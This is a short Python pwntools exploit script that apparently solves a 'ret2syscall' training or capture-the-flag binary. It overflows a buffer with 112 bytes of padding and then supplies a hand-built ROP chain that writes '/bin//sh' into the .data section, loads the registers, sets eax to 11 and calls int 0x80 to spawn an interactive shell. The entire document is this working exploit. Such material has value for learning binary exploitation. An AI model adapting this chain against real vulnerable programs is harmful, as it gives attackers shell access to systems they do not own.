from pwn import *
from struct import pack

# Padding goes here
p = b"a" * 112

p += pack("<I", 0x0806EB6A)  # pop edx ; ret
p += pack("<I", 0x080EA060)  # @ .data
p += pack("<I", 0x080BB196)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x0809A4AD)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0806EB6A)  # pop edx ; ret
p += pack("<I", 0x080EA064)  # @ .data + 4
p += pack("<I", 0x080BB196)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x0809A4AD)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x0806EB6A)  # pop edx ; ret
p += pack("<I", 0x080EA068)  # @ .data + 8
p += pack("<I", 0x08054590)  # xor eax, eax ; ret
p += pack("<I", 0x0809A4AD)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080481C9)  # pop ebx ; ret
p += pack("<I", 0x080EA060)  # @ .data
p += pack("<I", 0x0806EB91)  # pop ecx ; pop ebx ; ret
p += pack("<I", 0x080EA068)  # @ .data + 8
p += pack("<I", 0x080EA060)  # padding without overwrite ebx
p += pack("<I", 0x0806EB6A)  # pop edx ; ret
p += pack("<I", 0x080EA068)  # @ .data + 8
p += pack("<I", 0x08054590)  # xor eax, eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x0807B5BF)  # inc eax ; ret
p += pack("<I", 0x08049421)  # int 0x80

sh = process("./bin/ret2syscall")
sh.sendline(p)
sh.interactive()
